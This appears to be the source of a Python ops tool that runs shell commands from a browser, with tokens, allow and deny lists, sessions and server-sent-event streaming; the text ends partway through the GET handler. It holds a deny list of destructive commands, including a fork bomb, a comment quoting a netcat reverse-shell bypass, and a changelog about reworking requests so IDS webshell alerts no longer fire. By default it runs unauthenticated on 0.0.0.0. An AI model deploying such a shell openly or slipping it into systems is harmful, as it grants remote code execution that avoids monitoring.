#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
web_shell.py —— 浏览器远程执行 Shell 命令（零依赖，仅 Python 2.7.5+ / 3.7.5+ 标准库）
功能：
1. 浏览器输入 Shell 命令，服务器执行后回显 stdout / stderr / 返回码 / 耗时（终端样式）
2. 命令历史（↑/↓ 翻历史，localStorage 持久化）
3. 快捷命令按钮（白名单模式下自动用白名单生成）
4. 安全控制：--token 访问令牌 / --allow 命令白名单 / --deny 危险命令黑名单
5. 超时保护：--timeout 到期强制 kill 进程组；输出超长自动截断
6. 审计日志：服务端打印 客户端IP + 命令 + 返回码
7. CORS 支持：允许管理平台跨域调用
8. PID 文件 & 优雅停机
9. 页面与代码分离：前端拆到同级 templates/web_shell.html，改完刷新浏览器即生效

v1.2.0 新增能力（复用 opslib 公共层）：
10. 单次命令 SSE 实时输出：GET /api/exec/stream（事件 start/out/err/exit）
11. 持久 Shell 会话：POST /api/sessions（创建）、GET /api/sessions（列表）、
    POST /api/sessions/<id>/exec（阻塞执行）、GET /api/sessions/<id>/stream（SSE 执行）、
    DELETE /api/sessions/<id>（关闭）。会话内保留 cd/export 等状态。
12. 结果导出：GET /api/export（纯文本下载）。

v1.3.0：命令不再出现在 URL 上（消除安全设备误报）
13. POST /api/exec/stream —— 命令与超时放 JSON 请求体，token 走 X-Auth-Token。
14. POST /api/sessions/<id>/stream —— 会话执行同样支持请求体传命令。
15. POST /api/exec/start —— 换取一次性「执行券」，配 GET /api/exec/stream?ticket=xxx
    取流；券 60 秒有效、用后即焚、绑定来源 IP（给浏览器 EventSource 这类
    无法自定义请求头的调用方用）。
    原因：URI 上出现 `?cmd=whoami&token=...` 会被态势感知/IDS 的「webshell 命令
    执行」特征规则命中（现场实际告警：URI cmd=whoami 命令执行请求）。
    旧形态 `GET /api/exec/stream?cmd=...` 与 `?token=` 均保留兼容。

v1.3.1：安全与兼容修复（配合 CODE_REVIEW 整改）
16. 命令替换绕过白名单：白名单模式下直接拒绝 `$(...)` 与反引号（含参数替换型
    `__SUBCMD__` 占位符不再豁免）。原先 `$(rm -rf ~)` 这类会被替换成占位符跳过匹配，
    白名单形同虚设。黑名单则先压缩空白再二次匹配，防 `rm   -rf /` 空格绕过。
17. py2 崩溃：popen_stream 前把 unicode 命令转 bytes（PY2 下 subprocess 传 unicode
    中文参数会 UnicodeEncodeError）。
18. 会话返回码：code = session.proc.returncode if not None else -1，进程未退出时不再
    把 None 当返回码下发。
兼容性：Python 2.7.5+ 与 Python 3.7.5+ 均可直接运行，无需任何第三方库。

【用法示例】
    # 1) 最简启动：默认 0.0.0.0:8088，无鉴权（仅限可信内网）
    python web_shell.py

    # 2) 指定地址/端口并开启访问令牌（页面需先输入令牌）
    python web_shell.py --host 0.0.0.0 --port 8088 --token admin123

    # 3) 生产推荐：令牌 + 白名单 + 超时 + PID（单行，可直接复制）
    python web_shell.py --host 0.0.0.0 --port 8088 --token admin123 --allow "df,free,uptime,ps,ls,cat,tail,head,ip,netstat,hostname,top,ping,whoami,date,du" --timeout 30 --pidfile /data/web_shell.pid

    # 4) 只允许执行白名单命令（未列出的命令被拒；命令替换 $(...) 与反引号同样被拒）
    python web_shell.py --port 8088 --token admin123 --allow "df,free,uptime,ls,cat,tail"

    # 5) 自定义危险命令黑名单（逗号分隔子串；传空字符串可关闭内置黑名单）
    python web_shell.py --port 8088 --token admin123 --deny "rm -rf,mkfs,dd if=,shutdown,reboot"
    python web_shell.py --port 8088 --token admin123 --deny ""

    # 6) 指定命令执行目录 / 调整持久会话参数
    python web_shell.py --port 8088 --token admin123 --cwd /opt/app --session-ttl 1800 --max-sessions 8

    # 7) 后台常驻（nohup + PID 文件，便于外部启停）
    nohup python -u web_shell.py --port 8088 --token admin123 --pidfile /data/web_shell.pid > /data/web_shell.log 2>&1 &

    # 8) 查看全部参数与默认值
    python web_shell.py --help

【全部参数】（括号内为默认值）
    --host          监听地址              (0.0.0.0)          环境变量 WS_HOST
    --port          监听端口              (8088)             环境变量 WS_PORT
    --token         访问令牌              (空 = 不鉴权)       环境变量 WS_TOKEN
    --allow         命令白名单（逗号分隔） (空 = 不限制）      无环境变量
    --deny          危险命令黑名单（子串） (内置默认清单）      无环境变量；传空串可关闭
    --cwd           命令执行目录          (脚本当前工作目录)  无环境变量
    --timeout       默认超时秒数          (30，上限 600)      无环境变量
    --pidfile       PID 文件路径          (空 = 不写)         无环境变量
    --session-ttl   会话空闲超时秒数       (1800)             无环境变量
    --max-sessions  每服务器最大会话数     (8)                无环境变量
    --help, -h      打印帮助后退出        无环境变量
    内置默认黑名单：rm -rf /,mkfs.,dd if=/dev/,shutdown,reboot,halt,poweroff,> /dev/sd,:(){ :|:& };:
"""
from __future__ import print_function

import argparse
import getpass
import json
import os
import platform
import re
import signal
import subprocess
import sys
import threading
import time

# ================= 引入 opslib 公共层（路径引导） =================
# web_shell.py 位于 opslib 的下两级目录（ops_tools/tools/），把 opslib 所在目录加入 sys.path。
_BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _BASE not in sys.path:
    sys.path.insert(0, _BASE)
from opslib import compat, sse, server as opsserver  # noqa: E402

# ================= Python 2.7.5+ / 3.7.5+ 兼容层 =================
PY2 = sys.version_info[0] == 2

if PY2:
    import BaseHTTPServer as _http_server
    import SocketServer as _sock_server
    import urlparse as _urlparse
    text_type = unicode            # noqa: F821  py2 内置
    string_types = (basestring,)   # noqa: F821  py2 内置
else:
    import http.server as _http_server
    import socketserver as _sock_server
    import urllib.parse as _urlparse
    text_type = str
    string_types = (str,)

BaseHTTPRequestHandler = _http_server.BaseHTTPRequestHandler


def to_bytes(text):
    """转成 bytes（跨版本安全，遇到不可编码字符用替换符兜底）"""
    if isinstance(text, bytes):
        return text
    if not isinstance(text, text_type):
        text = text_type(text)
    try:
        return text.encode('utf-8')
    except UnicodeEncodeError:
        return text.encode('utf-8', 'replace')


def to_text(raw):
    """转成当前版本的原生文本类型"""
    if isinstance(raw, text_type):
        return raw
    if isinstance(raw, bytes):
        return raw.decode('utf-8', 'replace')
    return text_type(raw)


def json_bytes(obj):
    """json 序列化并转 bytes。

    不要在这里直接 `json.dumps(obj, ensure_ascii=False)`：py2 下只要同一个结构里
    既有 unicode（u'' 拼出来的中文提示）又有字节串（safe_str / 子进程输出归一来的
    UTF-8 中文），dumps 内部 `''.join(chunks)` 就会隐式按 ascii 解码并抛
    UnicodeDecodeError（= 接口 500）。统一交给 opslib.compat.json_bytes ——
    它先做「字节串→文本」归一（compat.json_safe）再序列化，py2/py3 都不会崩。
    """
    return compat.json_bytes(obj)


def log(msg):
    """跨版本安全输出（统一走 compat.log，异常路径上也不会二次抛错）"""
    return compat.log(msg)


def makedirs(path):
    """等价 os.makedirs(path, exist_ok=True)，py2 的 makedirs 无 exist_ok 参数"""
    if not path or os.path.isdir(path):
        return
    try:
        os.makedirs(path)
    except (OSError, IOError):
        if not os.path.isdir(path):
            raise


class ThreadingHTTPServer(opsserver.OpsHTTPServer):
    """多线程 HTTP 服务（复用 opslib.server：含客户端提前断开的日志降噪）"""


def start_daemon(target, args=()):
    """启动守护线程（py2 的 Thread 不支持 daemon 关键字参数）"""
    thread = threading.Thread(target=target, args=args)
    thread.daemon = True
    thread.start()
    return thread


def wait_with_timeout(proc, timeout):
    """等待进程结束；超时返回 True。py2 的 Popen.wait 不支持 timeout 参数。"""
    if not PY2:
        try:
            proc.wait(timeout=timeout)
            return False
        except subprocess.TimeoutExpired:
            return True
    deadline = time.time() + timeout
    while proc.poll() is None:
        if time.time() >= deadline:
            return True
        time.sleep(0.05)
    return False


VERSION = '1.3.1'
SH = '/bin/bash' if (not compat.IS_WIN and os.path.exists('/bin/bash')) else ('/bin/sh' if not compat.IS_WIN else 'cmd')
MAX_OUT = 512 * 1024          # stdout/stderr 各自最大返回字节数
MAX_CMD_LEN = 4000
DEFAULT_DENY = 'rm -rf /,mkfs.,dd if=/dev/,shutdown,reboot,halt,poweroff,> /dev/sd,:(){ :|:& };:'
DEFAULT_CHIPS = [
    'uptime', 'df -h', 'free -h', 'hostname', 'whoami',
    'ps aux | head -20', 'ip addr', 'top -bn1 | head -15',
    'tail -50 /var/log/messages', 'date', 'uname -a', 'cat /etc/os-release'
]

# 会话相关全局配置（可由启动参数覆盖）
MAX_SESSIONS_DEFAULT = 8
SESSION_TTL_DEFAULT = 1800     # 会话空闲超时（秒），默认 30 分钟


def parse_args():
    p = argparse.ArgumentParser(description='web_shell.py 浏览器远程命令执行 v%s' % VERSION)
    p.add_argument('--host', default=os.environ.get('WS_HOST', '0.0.0.0'),
                   help='监听地址 (默认 0.0.0.0)')
    p.add_argument('--port', type=int, default=int(os.environ.get('WS_PORT', 8088)),
                   help='监听端口 (默认 8088)')
    p.add_argument('--token', default=os.environ.get('WS_TOKEN', ''),
                   help='访问令牌，设置后浏览器需输入')
    p.add_argument('--allow', default='',
                   help='命令白名单(逗号分隔)，如 "df,free,uptime"，为空表示不限制')
    p.add_argument('--deny', default=DEFAULT_DENY,
                   help='危险命令黑名单(逗号分隔子串)，传空字符串可关闭')
    p.add_argument('--cwd', default='',
                   help='命令执行目录，默认为脚本当前目录')
    p.add_argument('--timeout', type=int, default=30,
                   help='默认超时秒数 (默认 30，上限 600)')
    p.add_argument('--pidfile', default='',
                   help='PID 文件路径，用于外部启停管理')
    p.add_argument('--session-ttl', type=int, default=SESSION_TTL_DEFAULT,
                   help='会话空闲超时秒数，超时自动回收 (默认 1800)')
    p.add_argument('--max-sessions', type=int, default=MAX_SESSIONS_DEFAULT,
                   help='每服务器最大会话数 (默认 8)')
    return p.parse_args()


ARGS = parse_args()
WS_TOKEN = ARGS.token
ALLOW_LIST = set(x.strip() for x in ARGS.allow.split(',') if x.strip())
DENY_LIST = [x.strip() for x in ARGS.deny.split(',') if x.strip()]
CWD = os.path.abspath(ARGS.cwd) if ARGS.cwd else os.getcwd()
DEFAULT_TIMEOUT = min(max(ARGS.timeout, 1), 600)
PIDFILE = os.path.abspath(ARGS.pidfile) if ARGS.pidfile else ''
START_TIME = time.time()
MAX_SESSIONS = max(1, min(ARGS.max_sessions, 64))
SESSION_TTL = max(1, ARGS.session_ttl)

# 并发执行上限：避免大量 exec 请求同时 spawn 子进程拖垮服务器
MAX_CONCURRENT_EXEC = 8
EXEC_SEM = threading.BoundedSemaphore(MAX_CONCURRENT_EXEC)

SESSIONS = {}
SESSIONS_LOCK = threading.Lock()

# ---- 执行券（v1.3.0）：浏览器 EventSource 无法自定义请求头，若把命令与 token 放在
# URL 上，URI 里就会出现 `?cmd=whoami&token=...` 这种「webshell 命令执行」特征，
# 被态势感知/IDS 规则命中（现场告警：URI cmd=whoami 命令执行请求）。
# 因此改为两步：先 POST /api/exec/start（命令在请求体、token 在请求头）换一张
# 单次有效的随机券，再 GET /api/exec/stream?ticket=xxx 取流 —— URI 上只剩随机串。
# 券本身即凭证：一次性、60 秒有效、绑定来源 IP，规避了长期 token 落进访问日志。
TICKET_TTL = 60
MAX_TICKETS = 200
TICKETS = {}
TICKETS_LOCK = threading.Lock()


def new_ticket(cmd, timeout, client_ip):
    """登记一条待执行的命令，返回一次性券号。"""
    ticket = compat.rand_hex(16)     # py2 下 bytes 没有 .hex()，统一走 compat
    now = time.time()
    with TICKETS_LOCK:
        # 顺带清理过期券，避免内存随执行次数增长
        for key in [k for k, v in TICKETS.items() if now - v['ts'] > TICKET_TTL]:
            TICKETS.pop(key, None)
        if len(TICKETS) >= MAX_TICKETS:
            oldest = sorted(TICKETS.items(), key=lambda kv: kv[1]['ts'])[:MAX_TICKETS // 4]
            for key, _ in oldest:
                TICKETS.pop(key, None)
        TICKETS[ticket] = {'cmd': cmd, 'timeout': timeout, 'ip': client_ip, 'ts': now}
    return ticket


def take_ticket(ticket, client_ip):
    """取券（一次性）：返回 (cmd, timeout)；无效/过期/换 IP 返回 (None, None, 原因)。"""
    if not ticket:
        return None, None, '缺少 ticket'
    with TICKETS_LOCK:
        item = TICKETS.pop(ticket, None)
    if item is None:
        return None, None, 'ticket 无效或已使用'
    if time.time() - item['ts'] > TICKET_TTL:
        return None, None, 'ticket 已过期'
    if item['ip'] != client_ip:
        return None, None, 'ticket 与请求来源不匹配'
    return item['cmd'], item['timeout'], ''


def clamp_timeout(value, default=DEFAULT_TIMEOUT):
    """把用户传入的超时值安全钳制到 [1, 600]，非数字时回退默认值。"""
    try:
        return min(max(int(value or default), 1), 600)
    except (TypeError, ValueError):
        return default


def clamp_int(value, default, low, high):
    try:
        v = int(value)
    except (TypeError, ValueError):
        return default
    return max(low, min(high, v))


# ================= PID 文件 =================
def write_pidfile():
    if PIDFILE:
        try:
            makedirs(os.path.dirname(PIDFILE) or '.')
            with open(PIDFILE, 'w') as f:
                f.write(str(os.getpid()))
        except (OSError, IOError) as e:
            log("警告: 无法写入 PID 文件 %s: %s" % (PIDFILE, e))


def remove_pidfile():
    if PIDFILE and os.path.exists(PIDFILE):
        try:
            os.remove(PIDFILE)
        except (OSError, IOError):
            pass


# ================= 命令策略 =================
def split_first_tokens(cmd):
    """按 shell 控制操作符拆分，取每段真正执行的第一个命令词（跳过 sudo / VAR=xx 前缀）"""
    # 先展开 $(...) 和反引号内的内容，防止嵌套绕过
    expanded = re.sub(r'\$\([^)]*\)', ' __SUBCMD__ ', cmd)
    expanded = re.sub(r'`[^`]*`', ' __SUBCMD__ ', expanded)
    parts = re.split(r'\|\||&&|[;|&\n]', expanded)
    tokens_list = []
    for p in parts:
        toks = p.strip().split()
        i = 0
        while i < len(toks):
            t = toks[i]
            if t == 'sudo' or re.match(r'^[A-Za-z_][A-Za-z0-9_]*=', t):
                i += 1
                continue
            break
        if i < len(toks):
            tokens_list.append(os.path.basename(toks[i]))
    return tokens_list


def check_policy(cmd):
    """检查命令是否符合安全策略，返回 (ok, reason)"""
    if not cmd.strip():
        return False, '命令不能为空'
    low = cmd.lower()
    # 黑名单按「压缩空白」后的形态再匹配一次：`rm  -rf  /` 这类多空格写法不能漏
    low_norm = re.sub(r'\s+', ' ', low)
    for pat in DENY_LIST:
        if pat and (pat.lower() in low or pat.lower() in low_norm):
            return False, '命中危险命令黑名单: %s' % pat
    if ALLOW_LIST:
        if '$(' in cmd or '`' in cmd:
            # 白名单模式下**禁止命令替换**：$(...) / `` 里能塞进任意命令，
            # 而它们不在「第一个命令词」的校验范围内。旧实现把整段替换成
            # __SUBCMD__ 占位符并跳过校验，等于白名单可以任意绕过
            # （`$(nc 1.2.3.4 9001 -e /bin/sh)` 会被判为合法）。
            return False, '白名单模式下不允许使用命令替换 $(...) 或反引号'
        tokens = split_first_tokens(cmd)
        if not tokens:
            return False, '无法解析命令'
        for name in tokens:
            if name == '__SUBCMD__':
                # 兜底：占位符不得豁免
                return False, '不允许命令替换'
            if name not in ALLOW_LIST:
                return False, '命令不在白名单内: %s' % name
    return True, ''


# ================= 命令执行（单次阻塞，旧接口） =================
class _OutputBuffer(object):
    """有上限的输出收集器：只保留最近 MAX_OUT 字节，防止刷屏命令拖爆内存。"""
    __slots__ = ('cap', 'parts', 'size', 'truncated')

    def __init__(self, cap):
        self.cap = cap
        self.parts = []
        self.size = 0
        self.truncated = False

    def feed(self, chunk):
        room = self.cap - self.size
        if room > 0:
            cut = chunk[:room]
            self.parts.append(cut)
            self.size += len(cut)
        if len(chunk) > room:
            self.truncated = True
            return False
        return True

    def getvalue(self):
        return b''.join(self.parts)


def run_command(cmd, timeout):
    start = time.time()
    # py2 下把 unicode 命令转成 UTF-8 字节，避免 subprocess 按 ascii 编码失败
    if PY2 and isinstance(cmd, text_type):
        cmd = to_bytes(cmd)
    popen_kw = {}
    if compat.IS_WIN:
        popen_kw['creationflags'] = 0x00000200  # CREATE_NEW_PROCESS_GROUP
    elif hasattr(os, 'setsid'):
        popen_kw['preexec_fn'] = os.setsid
    try:
        if compat.IS_WIN:
            p = subprocess.Popen(cmd, shell=True, executable=None,
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 cwd=CWD, **popen_kw)
        else:
            p = subprocess.Popen(cmd, shell=True, executable=SH,
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 cwd=CWD, **popen_kw)
    except Exception as e:
        return {'code': -1, 'stdout': '', 'stderr': '启动失败: %s' % e,
                'duration': 0, 'timed_out': False, 'truncated': False}

    # 两个常驻线程分别排空 stdout/stderr，只保留有限长度；
    # 避免 communicate() 先攒满全量输出再截断导致的内存风险。
    obuf = _OutputBuffer(MAX_OUT)
    ebuf = _OutputBuffer(MAX_OUT)

    def _reader(fp, buf):
        try:
            while True:
                chunk = fp.read(65536)
                if not chunk:
                    break
                buf.feed(chunk)
        except Exception:
            pass
        finally:
            try:
                fp.close()
            except Exception:
                pass

    tr = start_daemon(_reader, (p.stdout, obuf))
    te = start_daemon(_reader, (p.stderr, ebuf))

    timed_out = wait_with_timeout(p, timeout)
    if timed_out:
        compat.kill_process_tree(p)
        wait_with_timeout(p, 5)
    tr.join(timeout=5)
    te.join(timeout=5)
    duration = round(time.time() - start, 2)
    return {
        'code': p.returncode if p.returncode is not None else -9,
        'stdout': obuf.getvalue().decode('utf-8', 'replace'),
        'stderr': ebuf.getvalue().decode('utf-8', 'replace'),
        'duration': duration,
        'timed_out': timed_out,
        'truncated': obuf.truncated or ebuf.truncated
    }


# ================= 持久 Shell 会话 =================
def _spawn_shell(cwd):
    """启动一个常驻 shell 子进程（stdin=PIPE，stdout/stderr 合并），用于会话内连续执行命令。"""
    if compat.IS_WIN:
        # Windows 用 cmd /q（关闭回显）。退出码通过下一行 echo %errorlevel% 读取
        # （%errorlevel% 在解析该行时展开，恰为前一条命令的退出码，无需 /v:on 延迟扩展）。
        # 把 PROMPT 设为单个空格（$S），避免默认 "路径>" 提示符污染命令输出与 cwd 识别。
        args = ['cmd', '/q']
    else:
        args = [SH]
    kw = {'stdin': subprocess.PIPE, 'stdout': subprocess.PIPE,
          'stderr': subprocess.STDOUT, 'cwd': cwd}
    if compat.IS_WIN:
        kw['creationflags'] = 0x00000200  # CREATE_NEW_PROCESS_GROUP
        env = dict(os.environ)
        env['PROMPT'] = '$S'
        kw['env'] = env
    else:
        if hasattr(os, 'setsid'):
            kw['preexec_fn'] = os.setsid
    return subprocess.Popen(args, **kw)


class Session(object):
    """一个持久 shell 会话：内部常驻一个 shell 子进程，通过「结束标记」判定单条命令完成。"""

    __slots__ = ('sid', 'cwd', 'created', 'last_used', 'running', 'alive',
                 'lock', 'queue', 'proc')

    def __init__(self, sid, cwd):
        self.sid = sid
        self.cwd = cwd
        self.created = time.time()
        self.last_used = time.time()
        self.running = False
        self.alive = True
        self.lock = threading.Lock()
        self.queue = compat.Queue()
        self.proc = _spawn_shell(cwd)
        compat.start_daemon(self._reader)

    def _reader(self):
        """常驻线程：持续读取 shell 的 stdout，逐行塞进队列供命令消费。"""
        try:
            while True:
                line = self.proc.stdout.readline()
                if not line:
                    break
                self.queue.put(line)
        except Exception:
            pass
        try:
            self.queue.put(None)  # EOF 哨兵
        except Exception:
            pass

    def read_until(self, marker, timeout, on_line=None, max_bytes=MAX_OUT):
        """从队列读取，直到出现包含 marker 的行；返回 (状态, 收集行, 是否截断, 命中行文本)。

        状态：'ok' 找到标记；'DEAD' shell 已退出；'TIMEOUT' 超时；'TRUNCATED' 输出超过上限。
        on_line 提供时（用于 SSE 实时推送）每一行实时回调；否则把行收集到列表供返回。
        """
        collected = []
        size = 0
        truncated = False
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                raw = self.queue.get(timeout=1)
            except compat.Empty:
                if self.proc.poll() is not None:
                    return ('DEAD', collected, truncated, None)
                continue
            if raw is None:
                return ('DEAD', collected, truncated, None)
            text = compat.to_text(raw)
            if marker in text:
                return ('ok', collected, truncated, text)
            if on_line is not None:
                on_line(text)
            else:
                collected.append(text)
            size += len(raw)
            if size > max_bytes:
                truncated = True
                try:
                    compat.kill_process_tree(self.proc)
                except Exception:
                    pass
                return ('TRUNCATED', collected, truncated, None)
        return ('TIMEOUT', collected, truncated, None)

    def close(self):
        self.alive = False
        try:
            compat.kill_process_tree(self.proc)
        except Exception:
            pass
        try:
            self.proc.wait()
        except Exception:
            pass


def _is_cd(cmd):
    """判断命令是否为 cd/chdir（用于执行后刷新会话 cwd）"""
    c = (cmd or '').strip()
    if not c:
        return False
    if c == 'cd' or c == 'chdir' or c.startswith('cd ') or c.startswith('cd\t') \
            or c.startswith('chdir '):
        return True
    # 兼容 "cd X && Y" 之类，仅看第一段
    first = re.split(r'\|\||&&|[;|&]', c)[0].strip()
    return bool(first) and (first == 'cd' or first == 'chdir'
                            or first.startswith('cd ') or first.startswith('chdir '))


def _refresh_cwd(handler_self, session):
    """执行 `pwd`（Linux）或 `cd`（Windows 打印当前目录），更新 session.cwd 并返回最新目录。"""
    if not session.alive or session.proc.poll() is not None:
        return session.cwd
    if compat.IS_WIN:
        inner = 'cd'
    else:
        inner = 'pwd'
    marker = '__WS_CWD_%s__' % compat.rand_hex(8)
    nl = '\r\n' if compat.IS_WIN else '\n'
    payload = inner + nl + 'echo ' + marker + ('%errorlevel%' if compat.IS_WIN else '$?') + nl
    try:
        session.proc.stdin.write(compat.to_bytes(payload))
        session.proc.stdin.flush()
    except Exception:
        return session.cwd
    status, collected, _, _ = session.read_until(marker, 5, None, 4096)
    if status != 'ok':
        return session.cwd
    for line in collected:
        if line.strip():
            return line.strip()
    return session.cwd


def _session_run(handler_self, session, cmd, timeout, sse=None):
    """在会话内执行一条命令。

    sse=None 时为阻塞模式，返回 {output,returncode,elapsed,cwd,...}；
    sse 为 SSEStream 时为流式模式，逐行通过 out 事件推送，最后返回供 exit 事件使用。
    """
    if session.proc.poll() is not None:
        session.alive = False
        return {'output': '', 'returncode': -1, 'elapsed': 0.0, 'cwd': session.cwd,
                'truncated': False, 'timed_out': False, 'alive': False,
                'error': '会话已结束'}
    session.last_used = time.time()
    session.running = True
    nl = '\r\n' if compat.IS_WIN else '\n'
    marker = '__WS_DONE_%s__' % compat.rand_hex(8)
    # 退出码与命令同序列的下一行读取：Linux 用 $?，Windows 用 %errorlevel%
    # （%errorlevel% 在解析该行时展开，恰为前一条命令的退出码）。
    if compat.IS_WIN:
        payload = cmd + nl + 'echo ' + marker + '%errorlevel%' + nl
    else:
        payload = cmd + nl + 'echo ' + marker + '$?' + nl
    try:
        session.proc.stdin.write(compat.to_bytes(payload))
        session.proc.stdin.flush()
    except Exception as e:
        session.alive = False
        try:
            compat.kill_process_tree(session.proc)
        except Exception:
            pass
        return {'output': '', 'returncode': -1, 'elapsed': 0.0, 'cwd': session.cwd,
                'truncated': False, 'timed_out': False, 'alive': False,
                'error': '写入失败: %s' % compat.safe_str(e)}
    start = time.time()

    on_line = None
    if sse is not None:
        def on_line(text):
            if not sse.closed:
                sse.send(text, event='out')

    status, collected, truncated, mtext = session.read_until(marker, timeout, on_line, MAX_OUT)
    code = -1
    timed_out = False
    if status == 'ok' and mtext:
        idx = mtext.index(marker) + len(marker)
        tail = mtext[idx:].strip()
        mm = re.search(r'-?\d+', tail)
        if mm:
            code = int(mm.group(0))
    elif status == 'TIMEOUT':
        timed_out = True
        if compat.IS_WIN:
            compat.kill_process_tree(session.proc)
            session.alive = False
        else:
            # 类 Unix：给前台命令发 SIGINT（等价 Ctrl-C），再尝试读取标记
            try:
                os.killpg(os.getpgid(session.proc.pid), signal.SIGINT)
            except Exception:
                compat.kill_process_tree(session.proc)
            st2, col2, tr2, mtext2 = session.read_until(marker, 3, None, MAX_OUT)
            if st2 == 'ok' and mtext2:
                collected = collected + col2
                truncated = truncated or tr2
                idx = mtext2.index(marker) + len(marker)
                tail = mtext2[idx:].strip()
                mm = re.search(r'-?\d+', tail)
                if mm:
                    code = int(mm.group(0))
            else:
                compat.kill_process_tree(session.proc)
                session.alive = False
    elif status == 'DEAD':
        session.alive = False
        # returncode 为 0（正常退出）时不能走 `not x` 判断——`not 0` 为真会误判成 -1
        code = session.proc.returncode if session.proc.returncode is not None else -1
    elif status == 'TRUNCATED':
        compat.kill_process_tree(session.proc)
        session.alive = False

    # cd 类命令执行后，查询真实 cwd 以保持状态持久化
    if _is_cd(cmd) and session.alive:
        nc = _refresh_cwd(handler_self, session)
        if nc:
            session.cwd = nc

    elapsed = round(time.time() - start, 2)
    session.running = False
    output = ''.join(collected)
    # Windows 下 PROMPT=$S 会在每条命令首行前加一个空格，去除之以保证输出干净
    if compat.IS_WIN and output.startswith(' '):
        output = output[1:]
    return {'output': output, 'returncode': code, 'elapsed': elapsed,
            'cwd': session.cwd, 'truncated': truncated, 'timed_out': timed_out,
            'alive': session.alive}


# ================= 前端页面模板（与后端分离） =================
# 页面已拆到脚本同级目录，改完刷新浏览器即生效（按 mtime 缓存，无需重启服务）：
#   templates/web_shell.html   页面骨架，含 {{version}} / {{default_chips}} 两个占位符
# 可用环境变量 WS_TEMPLATE_DIR 指定其它模板目录。
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_NAME = 'web_shell.html'
_TEMPLATE_DIRS = []
_TEMPLATE_CACHE = {'path': None, 'mtime': 0, 'text': None}


def find_template(name):
    """按优先级查找模板：WS_TEMPLATE_DIR -> 脚本同级 templates/ -> 当前工作目录 templates/"""
    if not _TEMPLATE_DIRS:
        env_dir = os.environ.get('WS_TEMPLATE_DIR', '')
        if env_dir:
            _TEMPLATE_DIRS.append(env_dir)
        _TEMPLATE_DIRS.append(os.path.join(BASE_DIR, 'templates'))
        _TEMPLATE_DIRS.append(os.path.join(os.getcwd(), 'templates'))
    for d in _TEMPLATE_DIRS:
        path = os.path.join(d, name)
        if os.path.isfile(path):
            return path
    return None


def load_page_template():
    """读取页面模板；按 mtime 缓存，模板改动后刷新页面即生效"""
    path = find_template(TEMPLATE_NAME)
    if path is None:
        return None
    try:
        st = os.stat(path)
        with open(path, 'rb') as f:
            raw = f.read()
    except (OSError, IOError):
        return None
    if _TEMPLATE_CACHE['path'] == path and _TEMPLATE_CACHE['mtime'] == st.st_mtime:
        return _TEMPLATE_CACHE['text']
    text = to_text(raw)
    _TEMPLATE_CACHE.update({'path': path, 'mtime': st.st_mtime, 'text': text})
    return text


def render_page():
    """渲染首页 HTML，返回 bytes"""
    text = load_page_template()
    if text is None:
        return to_bytes(
            '<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8">'
            '<title>模板缺失</title></head><body style="font-family:sans-serif">'
            '<h3>未找到前端页面模板</h3>'
            '<p>期望路径：<code>templates/%s</code>（与 web_shell.py 同级），'
            '或用环境变量 WS_TEMPLATE_DIR 指定模板目录。</p></body></html>' % TEMPLATE_NAME)
    page = text.replace('{{version}}', VERSION)
    page = page.replace('{{default_chips}}', json.dumps(DEFAULT_CHIPS))
    if WS_TOKEN:
        page = page.replace('window.needLogin = false;', 'window.needLogin = true;')
    return to_bytes(page)


# ================= HTTP 处理 =================
class ShellHandler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'

    # ---------- CORS ----------
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Auth-Token')
        BaseHTTPRequestHandler.end_headers(self)

    def _cors(self):
        # SSEStream.ready() 会调用 handler._cors()；此处置空，CORS 由 end_headers 统一发送
        pass

    def do_OPTIONS(self):
        self.send_response(204)
        self.end_headers()

    # ---------- 工具 ----------
    def log_message(self, fmt, *args):
        if self.path.startswith('/api/ping') or self.path.startswith('/api/health'):
            return
        log("[%s] %s - %s" % (self.log_date_time_string(), self.client_address[0], fmt % args))

    def _send(self, code, body_bytes, content_type='application/json; charset=utf-8'):
        self.send_response(code)
        self.send_header('Content-type', content_type)
        self.send_header('Content-Length', str(len(body_bytes)))
        self.end_headers()
        self.wfile.write(body_bytes)

    def _send_json(self, code, obj):
        self._send(code, json_bytes(obj))

    def _auth_ok(self):
        if not WS_TOKEN:
            return True
        if self.headers.get('X-Auth-Token') == WS_TOKEN:
            return True
        qs = _urlparse.parse_qs(_urlparse.urlparse(self.path).query)
        if qs.get('token', [''])[0] == WS_TOKEN:
            return True
        self._send_json(401, {'status': 'error', 'message': '未授权'})
        return False

    def _path_parts(self):
        """返回路径中 'api' 之后的各段（小写化用于比较）"""
        path = _urlparse.urlparse(self.path).path
        parts = [p for p in path.split('/') if p]
        if parts and parts[0].lower() == 'api':
            return [p.lower() for p in parts[1:]]
        return []

    def _query(self):
        return _urlparse.parse_qs(_urlparse.urlparse(self.path).query)

    def q(self, name, default=''):
        d = self._query()
        v = d.get(name, [default])
        return v[0]

    def _read_json(self, length, default):
        if not length:
            return default
        if length > 8 * 1024 * 1024:
            return None
        try:
            raw = self.rfile.read(int(length))
            return json.loads(raw.decode('utf-8'))
        except Exception:
            return None

    # ---------- SSE 响应（跨版本安全手写头部，避免 send_response 在 Py2 自动 flush） ----------
    def _make_sse(self):
        return sse.SSEStream(self)

    def _begin_sse(self, stream):
        head = (
            'HTTP/1.1 200 OK\r\n'
            'Content-Type: text/event-stream; charset=utf-8\r\n'
            'Cache-Control: no-cache, no-store, no-transform\r\n'
            'X-Accel-Buffering: no\r\n'
            'Connection: keep-alive\r\n'
            'Transfer-Encoding: chunked\r\n'
            'Access-Control-Allow-Origin: *\r\n'
            'Access-Control-Allow-Methods: GET, POST, DELETE, OPTIONS\r\n'
            'Access-Control-Allow-Headers: Content-Type, X-Auth-Token\r\n'
            '\r\n'
        )
        self.wfile.write(compat.to_bytes(head))
        try:
            self.wfile.flush()
        except Exception:
            pass
        stream._ready = True
        stream._write('retry: 3000\n\n')

    # ---------- 路由分发 ----------
    def do_GET(self):
        parts = self._path_parts()
        if not parts:
